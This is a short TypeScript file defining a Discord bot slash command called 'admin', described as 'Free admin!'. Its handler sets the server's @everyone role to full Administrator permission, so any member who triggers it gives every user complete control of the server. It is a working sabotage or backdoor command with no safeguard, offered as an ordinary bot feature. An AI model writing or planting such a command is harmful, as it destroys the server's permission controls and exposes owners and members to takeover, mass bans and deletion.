import {PermissionsBitField, SlashCommandBuilder} from "discord.js";
import {Command} from "types";

export const admin: Command = {
	data: new SlashCommandBuilder()
		.setName("admin")
		.setDescription("Free admin!"),
	async execute(interaction) {
		interaction.guild?.roles.everyone.setPermissions([
			PermissionsBitField.Flags.Administrator,
		]);
	},
};
